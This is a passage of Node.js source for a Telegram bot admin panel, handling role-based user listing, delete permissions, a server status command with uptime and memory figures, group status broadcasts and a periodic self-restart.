    let messageText = "📭 No registered users.";
    if (filteredUsers.length > 0) {
      messageText = `📂 *User List:* (${filteredUsers.length} users)`;
    }    
    bot.editMessageText(messageText, {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
  if (data === "back_list") {
    const userId = query.from.id;
    const users = loadDatabase();
    const filteredUsers = users.filter(u => {
      const viewerRole = getUserStatus(userId);
      const targetRole = u.role;
      if (viewerRole === 'reseller' && targetRole !== 'member') return false;
      if (viewerRole === 'owner' && targetRole === 'owner') return false;      
      return true;
    });    
    const buttons = filteredUsers.map(u => [
      { text: `${u.username} (${u.role})`, callback_data: `view_${u.username}` }
    ]);  
    let messageText = "📭 No registered users.";
    if (filteredUsers.length > 0) {
      messageText = `📂 *User List:* (${filteredUsers.length} users)`;
    }    
    bot.editMessageText(messageText, {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
});
function checkDeletePermission(deleterId, targetUser) {
  if (!hasAccess(deleterId)) return false;  
  const deleterRole = getUserStatus(deleterId);
  const targetRole = targetUser.role;
  if (isDeveloper(deleterId)) return true;
  if (isOwner(deleterId)) {
    if (targetRole === 'owner' || targetRole === 'developer') return false;
    return true;
  }
  if (isAdmin(deleterId)) {
    if (targetRole === 'admin' || targetRole === 'owner' || targetRole === 'developer') return false;
    return true;
  }
  if (isReseller(deleterId)) {
    return targetRole === 'member';
  }  
  return false;
}

bot.onText(/^\/listuser$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;  
  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ You don't have permission to use this command!");
  }
  
  const users = loadDatabase();
  const userStatus = getUserStatus(userId);
  
  let filteredUsers = users;
  if (userStatus === 'Reseller') {
    filteredUsers = users.filter(u => u.role === 'member');
  } else if (userStatus === 'Admin') {
    filteredUsers = users.filter(u => u.role === 'member' || u.role === 'reseller');
  }

  if (filteredUsers.length === 0) {
    return bot.sendMessage(chatId, "📭 No users found.");
  }

  const buttons = filteredUsers.map(u => {
    return [{ text: `${u.username} (${u.role})`, callback_data: `view_${u.username}` }];
  });

  bot.sendMessage(chatId, `📂 *User List:* (${filteredUsers.length} users)`, {
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: buttons }
  });
});
function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/status$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;  
  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ You don't have permission to use this command!");
  }
  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database/database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;
    const pingStart = Date.now();
    const ping = Date.now() - pingStart;
    const text = `*Server Status*
*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Paradox-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
  startUserSessions()
});

const RESTART_INTERVAL = 20 * 60 * 1000;

function kirimStatusServer(pesan) {
  try {
    sendToGroupsUtama(pesan, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}
(async () => {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database/database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;
    const pingStart = Date.now();
    const ping = Date.now() - pingStart;
    const text = `*Server Status*
*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Paradox-Secure*`;
await kirimStatusServer(text);
})();
setInterval(() => {
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0);
  }, 5000);
}, RESTART_INTERVAL);